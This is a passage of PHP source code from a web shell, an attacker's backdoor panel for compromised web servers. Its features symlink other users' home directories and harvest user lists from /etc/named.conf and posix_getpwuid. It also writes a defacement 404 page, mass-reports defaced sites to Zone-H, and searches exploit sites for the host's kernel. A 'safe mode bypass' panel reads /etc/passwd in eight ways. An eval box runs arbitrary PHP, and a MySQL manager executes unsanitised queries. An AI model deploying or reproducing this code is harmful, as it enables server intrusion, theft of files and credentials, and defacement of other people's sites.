					$file = fopen("test.txt", "r") or exit("Unable to open file!");
					while(!feof($file))
					{
					 	$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							syml($matches,$matches);
					}
					fclose($file);
					unlink("test.txt");
					echo "<center><font class=txt>[ Done ]</font></center>";
					echo "<br><center><a href=dhanushSPT target=_blank><font class=txt>| Go Here |</font></a></center>"; 
				}
			}
			else if(isset($_REQUEST['automatic']))
			{
				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir("dhanushST");
					chdir("dhanushST");
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font class=txt>[ Done ]</font></center>";
					echo "<br><center><a href=dhanushST target=_blank><font class=txt>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir("dhanushSPT");
					chdir("dhanushSPT");
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font class=txt>[ Done ]</font></center>";
					echo "<br><center><a href=dhanushSPT target=_blank><font class=txt>| Go Here |</font></a></center>"; 
				}
			}
		}
	}	
	
		// Exploit Search
	else if(isset($_GET["exploit"]))
	{
		if(!isset($_GET["rootexploit"]))
		{
			?>
			<center>
			<form action="<?php echo $self; ?>" method="get" target="_blank">
			<input type="hidden" name="exploit">
			<table border="1" cellpadding="5" cellspacing="4" style="width:50%;">
			<tr>
				<td style="height:60px;">
			<font size="4">Select Website</font></td><td>
			<p><select id="rootexploit" name="rootexploit" class="box">
				<option value="exploit-db">Exploit-db</option>
				<option value="packetstormsecurity">Packetstormsecurity</option>
				<option value="exploitsearch">Exploitsearch</option>
				<option value="shodanhq">Shodanhq</option>
			</select></p></td></tr><tr><td colspan="2" align="center"  style="height:40px;">
			<input type="submit" value="Search" class="but"></td></tr></table>
			</form></center><br>
		
		<?php 
		}
		else
		{
			//exploit search
			$Lversion = php_uname(r);
			$OSV = php_uname(s);
			if(eregi('Linux',$OSV))
			{

				$Lversion=substr($Lversion,0,6);
				if($_GET['rootexploit'] == "exploit-db")
				{
					header("Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=Linux+Kernel+$Lversion");
				}
				else if($_GET['rootexploit'] == "packetstormsecurity")
				{
					header("Location:http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=Linux+Kernel+$Lversion");
				}
				else if($_GET['rootexploit'] == "exploitsearch")
				{
					header("Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=Linux+Kernel+$Lversion");
				}
				else if($_GET['rootexploit'] == "shodanhq")
				{
					header("Location:http://www.shodanhq.com/exploits?q=Linux+Kernel+$Lversion");
				}
			}
			else
			{
				$Lversion=substr($Lversion,0,3);
				if($_GET['rootexploit'] == "exploit-db")
				{
					header("Location:http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$OSV+Lversion");
				}
				else if($_GET['rootexploit'] == "packetstormsecurity")
				{
					header("Location:http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=$OSV+Lversion");
				}
				else if($_GET['rootexploit'] == "exploitsearch")
				{
					header("Location:http://exploitsearch.com/search.html?cx=000255850439926950150%3A_vswux9nmz0&cof=FORID%3A10&q=$OSV+Lversion");
				}
				else if($_GET['rootexploit'] == "shodanhq")
				{
					header("Location:http://www.shodanhq.com/exploits?q=$OSV+Lversion");
				}
			}
			//End of Exploit search
		}
	}
	
	else if(isset($_REQUEST['404']))
	{
		?>
		<center><table><tr><td><a href="<?php echo $self; ?>?404&new"><font size="4">| Set Your 404 Page |</font></a></td>
			<td><a href="<?php echo $self; ?>?404&old"><font size="4">| Set Specified 404 Page |</font></a></td>
			</tr></table></center><br>
			<?php 
			if(isset($_GET['old']))
			{
				if(strlen($ind) != 0)
				{
					$myfile = fopen(".htaccess", "a");
					fwrite($myfile, "ErrorDocument 404 /404.html \n\r");
			
					$myfilee = fopen("404.html", "w+");
					fwrite($myfilee, base64_decode($ind));
			
					fclose($myfile);
					header("Location:$self?set404");
					ob_end_flush();
				}
				else
					echo "<center>Nothing Specified in the shell</center>";
			}
			else if(isset($_REQUEST['new']))
			{
				if(strlen($ind) != 0)
				{
					if($myfile = fopen(".htaccess", "a"))
					{
						fwrite($myfile, "ErrorDocument 404 /404.html \n\r");
			
						if($myfilee = fopen("404.html", "w+"))
						{
							fwrite($myfilee, base64_decode($ind));
						
							fclose($myfilee);
							header("Location:$self?set404");
							ob_end_flush();
						}
						fclose($myfile);	
					}
					else
					{
						header("Location:$self?cannotset404");
						ob_end_flush();
					}
				}
				else
				{
					?>
					<form method=post>
					<center><textarea name=message cols=100 rows=18 class=box>lol! You just got hacked</textarea></br>
					<input type="submit" name=404page value="  Save  " class=but></center>
					</br>
					</form>
					<?php
				}
			}
	}
	
	else if(isset($_POST["SendNowToZoneH"]))
	{
		$hacker = $_POST['defacer'];
		$method = $_POST['hackmode'];
		$neden = $_POST['reason'];
		$site = $_POST['domain'];
		
		if (empty($hacker))
		{
			die("<center><font size=3>[-] You Must Fill the Attacker name !</font></center>");
		}
		elseif($method == "--------SELECT--------") 
		{
			die("<center><font size=3>[-] You Must Select The Method !</center>");
		}
		elseif($neden == "--------SELECT--------") 
		{
			die("<center><font size=3>[-] You Must Select The Reason</center>");
		}
		elseif(empty($site)) 
		{
			die("<center><font size=3>[-] You Must Inter the Sites List !</center>");
		}
		
		$i = 0;
	    $sites = explode("\n", $site);
	    echo "<pre class=ml1 style='margin-top:5px'>";
		while($i < count($sites)) 
		{
		if(substr($sites[$i], 0, 4) != "http") 
		{
				$sites[$i] = "http://".$sites[$i];
		}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "<font class=txt>Site : ".$sites[$i]." Posted !</font><br>";
		++$i;
		}
		 
		echo "<font class=txt size=4>Sending Sites To Zone-H Has Been Completed Successfully !! </font></pre>";
	}
	
	// Bypass
	else if (isset($_GET["bypass"]))
	{
		if(isset($_GET['copy']))
		{
			if(@copy($_GET['copy'],"test1.php")) 
			{
				$fh=fopen("test1.php",'r');
				echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars(@fread($fh,filesize("test1.php")))."</textarea></br></br>";
				@fclose($fh);
				unlink("test1.php");
			} 
		}
		else if(isset($_GET['imap']))
		{
			$string = $_GET['imap'];
			echo "<textarea cols=120 rows=20 class=box readonly>";
			$stream = imap_open($string, "", "");
			$str = imap_body($stream, 1);
			echo "</textarea>";
		}
		else if(isset($_GET['sql']))
		{
			echo "<textarea cols=120 rows=20 class=box readonly>";
			$file=$_GET['ssql'];
			
			
			$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
			$mysql_files = explode(':', $mysql_files_str);
			
			$sql = array (
			"USE $mdb",
			'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
			"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
			. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
			. "ESCAPED BY          '' "
			. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",
			
			"SELECT a FROM $tbl LIMIT 1"
			);
			mysql_connect ($mhost, $muser, $mpass);
			
			foreach ($sql as $statement) {
			   $q = mysql_query ($statement);
			
			   if ($q == false) die (
				  "FAILED: " . $statement . "\n" .
				  "REASON: " . mysql_error () . "\n"
			   );
			
			   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;
			
			   echo htmlspecialchars($r[0]);
			   mysql_free_result ($q);
			}
			echo "</textarea>";
		}
		else if(isset($_GET['curl']))
		{
			$ch=curl_init("file://" . $_GET[curl]);
			curl_setopt($ch,CURLOPT_HEADERS,0);
			curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
			$file_out=curl_exec($ch);
			curl_close($ch);
			echo "<textarea cols=120 rows=20 class=box readonly>".htmlspecialchars($file_out)."</textarea></br></br>";
		}
		else if(isset($_GET['include']))
		{
			if(file_exists($_GET['include']))
			{
				echo "<textarea cols=120 rows=20 class=box readonly>";
				@include($_GET['include']);
				echo "</textarea>";
			}
			else
				echo "<br><center><font size=3>Can't Read" . $_GET['include'] . "</font></center>";
		}
		else if(isset($_GET['id']))
		{
			echo "<textarea cols=120 rows=20 class=box readonly>";
			for($uid=0;$uid<60000;$uid++)
			{   //cat /etc/passwd
				$ara = posix_getpwuid($uid);
				if (!empty($ara)) 
				{
					while (list ($key, $val) = each($ara))
					{
						print "$val:";
					}
					print "\n";
				}
			}
			echo "</textarea>";
			break;
		}
		else if(isset($_GET['tempname']))
		{
			tempnam("/home/" . $_GET['tempname']);
		}
		else if(isset($_GET['sym']))
		{
			echo "<textarea cols=120 rows=20 class=box readonly>";
			$fp = fopen("hack15.txt","w+");
			fwrite($fp,"Php Hacker Was Here");
			@unlink($flib);
			$sym = "/home/" . $them . "/public_html/" . $k;
			$link = "/home/"  . $you . "/public_html/" . $folder . "/" . $flib;
			@symlink($sym, $link);
			if ($k{0} == "/") 
			{
				echo "<script> window.location = '" . $flib . "'</script>";
			}
			else
			{
				echo "<pre><xmp>";
				echo readlink($flib) . "\n";
				echo "Filesize: " . linkinfo($flib) . "B\n\n";
				echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/"  . $folder . "/" . $flib);
				echo "</textarea>";
			}
		}
		else
		{
			?>
			
			<table cellpadding="7" align="center" border="3" style="width:70%;" class="pwdtbl">
				<tr>
					<td align="center" colspan="2"><font size="4">Safe mode bypass</font></td>
				</tr>
				<tr>
					<td align="center">
						<p>Using copy() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="copy" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using imap() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="imap" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
				</tr>
						
				<tr>
					<td align="center">
						<p>Using sql() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="sql" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using Curl() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="curl" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
				</tr>
						
				<tr>
					<td align="center">
						<p>Bypass using include()</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="include" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using id() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="id" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
				</tr>
							
				<tr>
					<td align="center">
						<p>Using tempnam() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="tempname" value="../../../etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
					<td align="center">
						<p>Using symlink() function</p>
						<form action="<?php echo $self; ?>" method="get">
						<input type="hidden" name="bypass">
						<input type="text" name="sym" value="/etc/passwd" class="sbox"> <input type="submit" value="bypass" class="but">
						</form>
					</td>
				</tr>
			</table>
			</form>
			<?php
		}
	}
	else if (isset($_GET["phpc"]))
	{
		// If the comand was sent
		if(isset($_POST['code'])&& $_POST['code'] && isset($_POST['intext'])&& $_POST['intext'] == "disp")
		{
			// FIlter Some Chars we dont need
			?><br>
			<textarea name="code" class="box" cols="120" rows="10"><?php 
			$code = str_replace("<?php","",$_POST['code']);
			$code = str_replace("<?","",$code);
			$code = str_replace("?>","",$code);
	
			// Evaluate PHP CoDE!
			htmlspecialchars(eval($code));
			?>
			</textarea><?php 
		}
		else if(isset($_POST['code'])&& $_POST['code'] && !isset($_POST['intext']))
		{
			$code = str_replace("<?php","",$_POST['code']);
			$code = str_replace("<?","",$code);
			$code = str_replace("?>","",$code);
	
			// Evaluate PHP CoDE!
			?><br><font size="4">Result of execution this PHP-code :</font><br><font class="txt" size="3"><?php htmlspecialchars(eval($code)); ?></font><?php
		}
	  ?>
    <form method="POST">
    <textarea name="code" class="box" cols="120" rows="10"><?php if(isset($_POST['code'])) { echo $_POST['code']; } else { ?>phpinfo();<?php } ?></textarea>
	<br /><br />
    <input name="submit" value="Execute This COde! " class="but" type="submit" />
	<input type="checkbox" name="intext" value="disp"> <font class="txt" size="3">Display in Textarea</font>
    </form>
    <?php
	}
	

else if(isset($_GET['database']))
{ ?>
	<form action=<?php echo $self; ?> method="POST">
	<table style="width:90%;" cellpadding="4" align="center">
	<tr>
		<td colspan="2">Connect To Database</td>
	</tr>
	<tr>
		<td>Server Address :</td>
		<td><input type="text" class="box" name="server" value="localhost"></td>
		<!--<td rowspan="4"><textarea name="query" cols="60" rows="7" class="box">SHOW DATABASE</textarea>-->
	</tr>
	<tr>
		<td>Username :</td>
		<td><input type="text" class="box" name="username" value="root"></td>
	</tr>
	<tr>
		<td>Password:</td>
		<td><input type="text" class="box" name="password" value=""></td>
	</tr>
	
	<tr>
		<td></td>
		<td><input type="submit" value="  Connect  " name="executeit" class="but"></td>
	</tr>
	</table>
	</form>
<?php
}
// Execute Query
	else if(isset($_POST["executeit"]))
	{
		if(isset($_POST['username'])  && isset($_POST['server']))
		{ 
			$dbserver = $_POST['server'];
			$dbuser = $_POST['username'];
			$dbpass = $_POST['password'];
			
			setcookie("dbserver", $dbserver);			
			setcookie("dbuser", $dbuser);
			setcookie("dbpass", $dbpass);
			header("Location:$self?data");						
				
		}
	}
	else if(isset($_GET['data']))
	{
		listdatabase();
	}
	else if(isset($_GET['viewdb']))
	{
		listdatabase();	
	}
	
	else if(isset($_GET['action']) && isset($_GET['dbname']))
	{
		if($_GET['action'] == "createDB")
		{
			$dbname = $_GET['dbname'];
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$mysqlHandle = mysql_connect($dbserver, $dbuser, $dbpass);
			mysql_query("create database $dbname",$mysqlHandle);
			listdatabase();
		}
		if($_GET['action'] == 'dropDB')
		{
			$dbname = $_GET['dbname'];
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$mysqlHandle = mysql_connect($dbserver, $dbuser, $dbpass);
			mysql_query("drop database $dbname",$mysqlHandle);
			mysql_close($mysqlHandle);
			listdatabase();
		}
		if($_GET['action'] == 'listTables')
		{
			listtable();
		}
		
		// Create Tables
		if($_GET['action'] == "createtable")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("CREATE TABLE $tablename ( no INT )");
			listtable();
		}
		
		// Drop Tables
		if($_GET['action'] == "dropTable")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("drop table $tablename");
			listtable();
		}
		
		// Empty Tables
		if($_GET['action'] == "empty")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			mysql_query("delete from $tablename");
			listtable();
		}
		
		// Empty Tables
		if($_GET['action'] == "dropField")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$fieldname = $_GET['fieldname'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$queryStr = "ALTER TABLE $tablename DROP COLUMN $fieldname";
			mysql_select_db( $dbname, $mysqlHandle );
			mysql_query( $queryStr , $mysqlHandle );
			listtable();
		}
		
		// View Table Schema
		if($_GET['action'] == "viewSchema")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			echo "<br><div><font size=3>[ $dbname ]</font> - <font size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> <font size=3>&gt;</font> <a href=$self?action=listTables&dbname=$dbname&tablename=$tablename> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font class=txt size=3>[ Log Out ]</font> </a></div>";	
			$pResult = mysql_query( "SHOW fields FROM $tablename" );
			$num = mysql_num_rows( $pResult );
			echo "<br><br><table align=center class=pwdtbl style='width:80%;' border=1>";
			echo "<th>Field</th><th>Type</th><th>Null</th><th>Key</th></th>";
			for( $i = 0; $i < $num; $i++ ) 
			{
				$field = mysql_fetch_array( $pResult );
				echo "<tr>\n";
				echo "<td>".$field["Field"]."</td>\n";
				echo "<td>".$field["Type"]."</td>\n";
				echo "<td>".$field["Null"]."</td>\n";
				echo "<td>".$field["Key"]."</td>\n";
				echo "<td>".$field["Default"]."</td>\n";
				echo "<td>".$field["Extra"]."</td>\n";
				$fieldname = $field["Field"];
				echo "<td><a href='$self?action=dropField&dbname=$dbname&tablename=$tablename&fieldname=$fieldname' onClick=\"return confirm('Drop Field \'$fieldname\'?')\">Drop</a></td>\n";
				echo "</tr>\n";
			}
			echo "</table>";
			echo "<div><font size=3>[ $dbname ]</font> - <font size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> <font size=3>&gt;</font> <a href=$self?action=listTables&dbname=$dbname&tablename=$tablename> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font class=txt size=3>[ Log Out ]</font> </a></div>";
		}
		
		// Execute Query
		if($_GET['action'] == "executequery")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$result = mysql_query($_GET['executemyquery']); 
			
			//  results 
			echo "<html>\r\n". strtoupper($_GET['executemyquery']) . "<br>\r\n<table border =\"1\">\r\n"; 
			 
			$count = 0; 
			while ($row = mysql_fetch_assoc($result)) 
			{ 
			   echo "<tr>\r\n"; 
			 
			   if ($count==0) // list column names 
			   { 
				  echo "<tr>\r\n"; 
				  while($key = key($row)) 
				  { 
					 echo "<td><b>" . $key . "</b></td>\r\n"; 
					 next($row); 
				  } 
				  echo "</tr>\r\n"; 
			   } 
			 
			   foreach($row as $r) // list content of column names 
			   { 
				  if ($r=='') $r = '<font class=txt>NULL</font>'; 
				  echo "<td>" . $r . "</td>\r\n"; 
			   } 
			   echo "</tr>\r\n"; 
			   $count++; 
			} 
			echo "</table>\n\r<font class=txt size=3>" . $count . " rows returned.</font>\r\n</html>"; 
			echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=$self?action=listTables&dbname=$dbname&tablename=$tablename> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font size=3>[ Log Out ]</font> </a></div>";
		}
		
		// View Table Data
		if($_GET['action'] == "viewdata")
		{
			global $queryStr, $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby, $data;
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			echo "<br><div><font size=3>[ $dbname ]</font> - <font size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> <font size=3>&gt;</font> <a href=$self?action=listTables&dbname=$dbname&tablename=$tablename> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font class=txt size=3>[ Log Out ]</font> </a></div>";	
			?>
			<br><br>
			<form>
			<input type="hidden" value="<?php echo $_GET['dbname']; ?>" name="dbname">
			<input type="hidden" value="<?php echo $_GET['tablename']; ?>" name="tablename">
			<input type="hidden" value="executequery" name="action">
			<table>
				<tr>
					<td><textarea cols="60" rows="7" name="executemyquery" class="box">Execute Query..</textarea></td>
				</tr>
				<tr>
					<td><input type="submit" value="Execute" class="but"></td>
				</tr>
			</table>
			</form>
			<?php 
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$rowid = $row['COLUMN_NAME'];
			
			echo "<br><font size=4>Data in Table</font><br>";
			if( $tablename != "" )
				echo "<font size=3 class=txt>$dbname &gt; $tablename</font><br>";
			else
				echo "<font size=3 class=txt>$dbname</font><br>";
			
			$queryStr = "";
			$pag = 0;
			$queryStr = stripslashes( $queryStr );
			if( $queryStr == "" ) 
			{
				if(isset($_REQUEST['page']))
				{
					$res = mysql_query("select * from $tablename");
					$getres = mysql_num_rows($res);
					$coun = ceil($getres/30);
					if($_REQUEST['page'] != 1)
						$pag = $_REQUEST['page'] * 30;
					else
						$pag = $_REQUEST['page'] * 30;
					
					$queryStr = "SELECT * FROM $tablename LIMIT $pag,30";
					$sql = mysql_query("SELECT $rowid FROM $tablename ORDER BY $rowid LIMIT $pag,30");
					$arrcount = 1;
					$arrdata[$arrcount] = 0;
					while($row = mysql_fetch_array($sql))
					{
						$arrdata[$arrcount] = $row[$rowid];
						$arrcount++;
					}
				}
				else
				{
					$queryStr = "SELECT * FROM $tablename LIMIT 0,30";
					$sql = mysql_query("SELECT $rowid FROM $tablename ORDER BY $rowid LIMIT 0,30");
					$arrcount = 1;
					$arrdata[$arrcount] = 0;
					while($row = mysql_fetch_array($sql))
					{
						$arrdata[$arrcount] = $row[$rowid];
						$arrcount++;
					}
				}
				if( $orderby != "" )
					$queryStr .= " ORDER BY $orderby";
				echo "<a href='$PHP_SELF?action=viewSchema&dbname=$dbname&tablename=$tablename'><font size=3>Schema</font></a>\n";
			}
		
			$pResult = mysql_query($queryStr );
			$fieldt = mysql_fetch_field($pResult);
			$tablename = $fieldt->table;
			$errMsg = mysql_error();
		
			$GLOBALS[queryStr] = $queryStr;
		
			if( $pResult == false ) 
			{
				echoQueryResult();
				return;
			}
			if( $pResult == 1 ) 
			{
				$errMsg = "Success";
				echoQueryResult();
				return;
			}
		
			echo "<hr>\n";
		
			$row = mysql_num_rows( $pResult );
			$col = mysql_num_fields( $pResult );
		
			if( $row == 0 ) 
			{
				echo "<font size=3>No Data Exist!</font>";
				return;
			}
		
			if( $rowperpage == "" ) $rowperpage = 30;
			if( $page == "" ) $page = 0;
			else $page--;
			mysql_data_seek( $pResult, $page * $rowperpage );
		
			echo "<table cellspacing=1 cellpadding=5 border=1 class=pwdtbl align=center>\n";
			echo "<tr>\n";
			for( $i = 0; $i < $col; $i++ ) 
			{
				$field = mysql_fetch_field( $pResult, $i );
				echo "<th>";
				if($action == "viewdata")
					echo "<a href='$PHP_SELF?action=viewdata&dbname=$dbname&tablename=$tablename&orderby=".$field->name."'>".$field->name."</a>\n";
				else
					echo $field->name."\n";
				echo "</th>\n";
			}
			echo "<th colspan=2>Action</th>\n";
			echo "</tr>\n";
			$num=1;
			
			
			$acount = 1;
						
			for( $i = 0; $i < $rowperpage; $i++ ) 
			{
				$rowArray = mysql_fetch_row( $pResult );
				if( $rowArray == false ) break;
				echo "<tr>\n";
				$key = "";
				for( $j = 0; $j < $col; $j++ )
				 {
					$data = $rowArray[$j];
		
					$field = mysql_fetch_field( $pResult, $j );
					if( $field->primary_key == 1 )
						$key .= "&" . $field->name . "=" . $data;
		
					if( strlen( $data ) > 30 )
						$data = substr( $data, 0, 30 ) . "...";
					$data = htmlspecialchars( $data );
					echo "<td>\n";
					echo "<font class=txt>$data</font>\n";
					echo "</td>\n";
				}
			
				if(!is_numeric($arrdata[$acount]))
				echo "<td colspan=2>No Key</td>\n";
				else 
				{
					echo "<td><a href='$PHP_SELF?action=editData&$rowid=$arrdata[$acount]&dbname=$dbname&tablename=$tablename'>Edit</a></td>\n";
					echo "<td><a href='$PHP_SELF?action=deleteData&$rowid=$arrdata[$acount]&dbname=$dbname&tablename=$tablename' onClick=\"return confirm('Delete Row?')\">Delete</a></td>\n";
					$acount++;
				}
			}
			echo "</tr>\n";
		
		
			echo "</table>";
			if($arrcount > 30)
			{
				$res = mysql_query("select * from $tablename");
				$getres = mysql_num_rows($res);
				$coun = ceil($getres/30);
				echo "<form action=$self><input type=hidden value=viewdata name=action><input type=hidden name=tablename value=$tablename><input type=hidden value=$dbname name=dbname><select style='width: 95px;' name=page class=sbox>";
				for($i=0;$i<$coun;$i++)
					echo "<option value=$i>$i</option>";
				
				echo "</select> <input type=submit value=Go class=but></form>";
				echo "<br><div><font size=3>[ $dbname ]</font> - <font size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> <font size=3>&gt;</font> <a href=$self?action=listTables&dbname=$dbname&tablename=$tablename> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font class=txt size=3>[ Log Out ]</font> </a></div>";	
			}
		}
		
		// Delete Table Data
		if($_GET['action'] == "deleteData")
		{
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
			mysql_select_db($dbname);
			$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
			$row = mysql_fetch_array($sql);
			$row = $row['COLUMN_NAME'];
			$rowid = $_GET[$row];
			mysql_query("delete from $tablename where $row = '$rowid'");
			header("Location:$self?action=viewdata&dbname=$dbname&tablename=$tablename");
		}
		// Edit Table Data
		if($_GET['action'] == "editData")
		{
			global $queryStr, $action, $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $page, $rowperpage, $orderby, $data;
			$dbserver = $_COOKIE["dbserver"];
			$dbuser = $_COOKIE["dbuser"];
			$dbpass = $_COOKIE["dbpass"];
			$dbname = $_GET['dbname'];
			$tablename = $_GET['tablename'];
			echo "<br><div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=$self?viewdb&dbname=$dbname> <font size=3>Database List</font> </a> <font color=white size=3>&gt;</font> <a href=$self?action=listTables&dbname=$dbname&tablename=$tablename> <font size=3>Table List</font> </a> &nbsp; <a href=$self?logoutdb> <font size=3>[ Log Out ]</font> </a></div>";	
			?>
			<br><br>
			<form action="<?php echo $self; ?>" method="post">
			<input type="hidden" name="tablename" value="<?php echo $tablename; ?>">
